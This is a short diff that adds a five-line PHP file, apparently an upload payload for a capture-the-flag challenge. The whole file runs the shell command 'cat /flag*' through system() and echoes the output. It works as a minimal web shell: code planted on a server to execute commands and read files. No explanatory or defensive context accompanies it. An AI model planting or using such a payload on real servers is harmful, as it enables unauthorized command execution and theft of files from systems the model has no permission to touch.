@@ -1,0 +1,5 @@
+<?
+
+echo system("cat /flag*");
+
+?>
